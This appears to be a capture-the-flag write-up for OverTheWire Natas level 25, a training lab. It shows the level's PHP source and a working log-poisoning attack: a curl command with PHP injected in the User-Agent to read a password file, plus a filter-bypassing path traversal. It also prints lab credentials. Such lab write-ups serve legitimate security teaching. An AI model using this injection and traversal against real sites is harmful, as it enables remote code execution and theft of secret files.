# Natas Level 25
```bash
Username: natas25
Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
URL:      http://natas25.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas24.png" />
    <div align="center">Natas 25</div>
</figure>

And the [source code](http://natas25.natas.labs.overthewire.org/index-source.html):
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas24-view-sourcecode.png" />
    <div align="center">Natas 25 - View sourcecode</div>
</figure>

We can see two relevant parts:
```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

And:
```php
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
```

The select box contains options for each file in "language" directory.

The second script calling *setLanguage* and then echos to the page three variables:
* $__GREETING
* $__MSG
* $__FOOTER

The first script contains the definition of *setLanguage*.

If found GET parameter "lang", it "*safeinclude"* the file "language/&lt;lang&gt; (the default is en).

*safeinclude* first checks for path traversal (../) and replaces each "../" with "",

then it checks if the string "natas_webpass" found in the filename (if true, calling *logRequest* and returns), and finally, if the file exists, it includes it.

Lets take a look at [language/en](http://natas25.natas.labs.overthewire.org/language/en):
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas25-language-en.png" />
    <div align="center">Natas 25 - language/en</div>
</figure>

It declares the three global variables.

Lets understand the *logRequest* function.

It concatenates the current time, $_SERVER['HTTP_USER_AGENT'] and the message, and saves it to file.

We can preform [log poisioning](https://www.owasp.org/index.php/Log_Injection) (include some PHP code in the user agent), and after that traverse and view the log.
In order to bypass the "../" checking, we can write: "../<strong>.</strong>../<strong>.</strong>../<strong>/</strong>"

Lets use cURL for the log poisioning:
```bash
curl -u natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c -A "<?php include('/etc/natas_webpass/natas26') ?>" -v 'http://natas25.natas.labs.overthewire.org/?lang=../'
```

We get:
```bash
* Trying 176.9.9.172...
* Connected to natas25.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas25'
> GET /?lang=../ HTTP/1.1
> Host: natas25.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
> User-Agent: <?php include('/etc/natas_webpass/natas26') ?>
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sun, 27 May 2018 14:36:49 GMT
< Server: Apache/2.4.10 (Debian)
< Set-Cookie: PHPSESSID=bbqqe3jnomm3rbihup8fu1d8p0; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 1859
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "GHF6X7YwACaYYssHVY05cFq83hRktl4c" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<br />
<b>Warning</b>: include(/var/www/natas/natas25/language): failed to open stream: No such file or directory in <b>/var/www/natas/natas25/index.php</b> on line <b>38</b><br />
<br />
<b>Warning</b>: include(): Failed opening 'language/' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in <b>/var/www/natas/natas25/index.php</b> on line <b>38</b><br />
<br />
<b>Notice</b>: Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>: Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>: Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
<div align="right"><h6></h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas25.natas.labs.overthewire.org left intact
```

PHPSESSID is: <strong>bbqqe3jnomm3rbihup8fu1d8p0</strong>

Lets take a look in a path traversal [attempt](http://natas25.natas.labs.overthewire.org/?lang=../):
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas25-traversal-attempt.png" />
    <div align="center">Natas 25 - Path traversal attempt</div>
</figure>

We are here <b>/var/www/natas/natas25/index.php</b>,

and the logs are being saved in: "<strong>/var/www/natas/natas25/logs/natas25_" . session_id() .".log"</strong>

All we need is to traverse one time up and open this file: <strong>logs/natas25_bbqqe3jnomm3rbihup8fu1d8p0.log</strong>,

lets [do](http://natas25.natas.labs.overthewire.org/?lang=../.../...//logs/natas25_bbqqe3jnomm3rbihup8fu1d8p0.log) this:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas25-pwned.png" />
    <div align="center">Natas 25 - PWNed</div>
</figure>

We got the password for the next level: **oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T**